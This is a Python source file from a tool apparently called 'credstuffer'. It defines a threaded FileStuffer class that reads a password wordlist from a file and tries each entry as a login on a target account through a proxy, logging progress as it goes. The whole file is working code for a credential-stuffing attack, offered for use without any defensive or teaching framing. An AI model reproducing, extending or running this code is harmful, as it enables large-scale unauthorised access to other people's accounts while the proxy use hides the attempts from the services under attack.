import logging
import threading
from credstuffer.stuffer import Stuffer


class FileStuffer(Stuffer, threading.Thread):
    """ class FileStuffer to execute the stuffing algorithm with files

    USAGE:
            filestuffer = Filestuffer(account=account, filepath=/tmp/)
            filestuffer.start()
    """
    def __init__(self, account, filepath):
        self.logger = logging.getLogger('credstuffer')
        self.logger.info('Create class FileStuffer')

        # init base class
        Stuffer.__init__(self, account=account)
        threading.Thread.__init__(self)

        self.filepath = filepath

    def run(self) -> None:
        """ executes the run thread for account logins """

        # set proxy to account
        self.set_account_proxy()

        # get passwords from file
        self.logger.info("Open file {} for stuffing".format(self.filepath))
        with open(self.filepath, 'r', encoding='utf-8', errors='ignore') as f:
            for lineno, line in enumerate(f):
                password = line.strip('\n')
                # execute login
                self.account_login(password=password)
                if (lineno % 1000) == 0:
                    self.logger.info("File {} with line number {} and password {}".format(self.filepath, lineno, password))
